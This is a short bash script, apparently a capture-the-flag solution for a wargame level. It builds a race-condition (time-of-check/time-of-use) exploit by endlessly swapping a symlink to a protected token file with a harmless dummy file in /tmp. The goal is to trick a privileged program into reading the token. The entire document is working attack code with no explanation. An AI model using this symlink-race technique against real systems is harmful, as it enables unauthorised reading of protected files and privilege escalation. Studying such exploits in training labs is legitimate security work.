#!/bin/bash

TOKEN=/home/user/level10/token
SLINK=/tmp/symlink
HACKFILE=/tmp/hack
TMPFILE=$(/bin/mktemp)

/usr/bin/touch $HACKFILE
/bin/ln -s $TOKEN $SLINK

while true
do
   /bin/mv $SLINK $TMPFILE
   /bin/mv $HACKFILE $SLINK
   /bin/mv $TMPFILE $HACKFILE
done

